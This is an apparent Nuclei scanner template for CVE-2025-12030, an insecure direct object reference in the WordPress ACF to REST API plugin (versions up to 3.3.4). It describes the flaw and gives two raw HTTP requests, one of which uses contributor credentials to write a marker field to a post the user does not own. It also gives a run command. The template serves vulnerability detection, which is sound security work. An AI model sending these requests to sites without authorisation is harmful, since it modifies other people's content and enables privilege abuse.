id: CVE-2025-12030

info:
  name: ACF to REST API <= 3.3.4 - IDOR ACF Field Modification
  author: SnailSploit
  severity: medium
  description: |
    The ACF to REST API plugin for WordPress is vulnerable to Insecure Direct Object 
    Reference in all versions up to, and including, 3.3.4. This is due to insufficient 
    capability checks in the update_item_permissions_check() method, which only verifies 
    that the current user has the edit_posts capability without checking object-specific 
    permissions. This allows authenticated attackers with Contributor-level access to 
    modify ACF fields on posts they do not own, any user account, comments, taxonomy 
    terms, and even the global options page.
  reference:
    - https://github.com/SnailSploit/CVE-2025-12030
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/acf-to-rest-api/acf-to-rest-api-334-insecure-direct-object-reference-to-authenticated-contributor-acf-fieldoption-modification
    - https://cwe.mitre.org/data/definitions/639.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 4.3
    cve-id: CVE-2025-12030
    cwe-id: CWE-639
  metadata:
    verified: true
    max-request: 2
    vendor: airesvsg
    product: acf-to-rest-api
    framework: wordpress
  tags: cve,cve2025,wordpress,wp-plugin,idor,authenticated,acf

http:
  - raw:
      - |
        GET /wp-json/acf/v3/posts/1 HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        
      - |
        POST /wp-json/acf/v3/posts/1 HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Content-Type: application/json
        
        {"fields":{"nuclei_idor_test":"CVE-2025-12030-{{randstr}}"}}

    attack: pitchfork
    payloads:
      username:
        - "{{username}}"
      password:
        - "{{password}}"
    
    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "acf"
          - "fields"
        condition: and
      
      - type: word
        part: body_2
        words:
          - "nuclei_idor_test"
          - "CVE-2025-12030"
        condition: or
      
      - type: status
        status:
          - 200

    extractors:
      - type: json
        name: modified_fields
        part: body_2
        json:
          - '.acf'

# Variables to set when running:
# nuclei -t CVE-2025-12030.yaml -var username=contributor -var password=app_password -u https://target.com
